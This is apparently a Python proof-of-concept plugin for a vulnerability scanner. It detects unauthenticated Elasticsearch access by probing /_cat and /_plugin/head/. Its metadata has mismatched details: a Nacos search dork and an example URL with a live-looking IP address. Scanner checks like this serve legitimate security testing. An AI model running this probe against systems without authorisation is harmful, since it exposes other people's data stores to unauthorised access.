# coding:utf-8  
import requests
from lib.common import url_handle,get_random_ua
# ...
import urllib3
urllib3.disable_warnings()
_info = {
    "author" : "jijue",                      # POC作者
    "version" : "1",                    # POC版本，默认是1  
    "CreateDate" : "2021-06-08",        # POC创建时间
    "UpdateDate" : "2021-06-08",        # POC创建时间
    "PocDesc" : """
    略  
    """,                                # POC描述，写更新描述，没有就不写

    "name" : "Elasticsearch未授权访问",                        # 漏洞名称
    "AppName" : "Elasticsearch",                     # 漏洞应用名称
    "AppVersion" : "",                  # 漏洞应用版本
    "VulnDate" : "2020-12-29",                    # 漏洞公开的时间,不知道就写能查到的最早的文献日期，格式：xxxx-xx-xx
    "VulnDesc" : """
    ElasticSearch 是一款Java编写的企业级搜索服务，启动此服务默认会开放9200端口，可被非法操作数据。
    """,                                # 漏洞简要描述

    "fofa-dork":"title:\"Nacos\"",                     # fofa搜索语句
    "example" : "https://47.108.74.113/v1/auth/users?pageNo=1&pageSize=100",                     # 存在漏洞的演示url，写一个就可以了
    "exp_img" : "",                      # 先不管  

    "timeout" : 10,                      # 超时设定
}

def verify(host,proxy):
    """
    返回vuln

    存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

    不存在漏洞：vuln = [False,""]
    """
    vuln = [False,""]

    host = host.replace("elastic://","http://")
    url = url_handle(host) + "/_cat" # url自己按需调整
    url1 = url_handle(host) + "/_plugin/head/"

    
    headers = {"User-Agent":get_random_ua(),
                "Connection":"close",
                "Content-Type": "application/x-www-form-urlencoded",}
    
    try:
        """
        检测逻辑，漏洞存在则修改vuln值，漏洞不存在则不动
        """
        req = requests.get(url,headers = headers , proxies = proxy , timeout = _info["timeout"],verify = False)
        req1 = requests.get(url1, headers = headers , proxies = proxy , timeout = _info["timeout"],verify = False)
        if req.status_code == 200 and "=^.^=" in req.text and req1.status_code == 200:
            vuln = [True,req.text]
        else:
            vuln = [False,req.text]
    except Exception as e:
        raise e
    
    return vuln

